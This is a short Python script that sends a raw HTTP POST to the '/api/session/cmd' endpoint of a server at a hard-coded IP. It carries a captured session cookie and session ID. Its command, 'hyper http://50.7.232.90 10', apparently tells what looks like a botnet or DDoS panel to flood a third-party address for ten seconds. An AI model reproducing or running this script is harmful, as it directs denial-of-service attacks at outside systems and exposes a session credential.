import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('195.2.73.98', 5000))
s.send("POST http://195.2.73.98:5000/api/session/cmd HTTP/1.1\r\nHost: 195.2.73.98:5000\r\n\r\nConnection: keep-alive\r\nContent-Length: 82\r\nAccept: */*\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://195.2.73.98:5000\r\nReferer: http://195.2.73.98:5000/sessions\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: _ga=GA1.1.534554990.1688826710; _gid=GA1.1.738747068.1688826710; session=.eJwljjtuAzEMBe-iOgXFz3LpyyxIioKNAAmwa1dB7m4FKd-8YuanHfOs695uz_NVH-14jHZrBEG7wMgJU1N6MGupokzISlgPdAHpI3wiDBzuSMOSAJl2UwTuM2mQdsuObrmRpxcpuXVIQDBPctkpCgdg8EalUNV9WaKtkNdV539NXzOvcx7P78_6-gMmwZEmS8Yiu2tGuYRMFdkYzTiL92y_b5BDPns.ZKmMSQ.LbqXrcfafYz_DHYNxfi4A3HnwIY; _ga_226CPYEDPC=GS1.1.1688826710.1.1.1688833100.0.0.0\r\n\r\nsession_uid=70f60e6ef793bc79692a56e6f30d12e7&cmd=hyper+http%3A%2F%2F50.7.232.90+10".encode())

while True:
    data = s.recv(1024)
    if ( len(data) < 1 ) :
        break
    print(data)
s.close()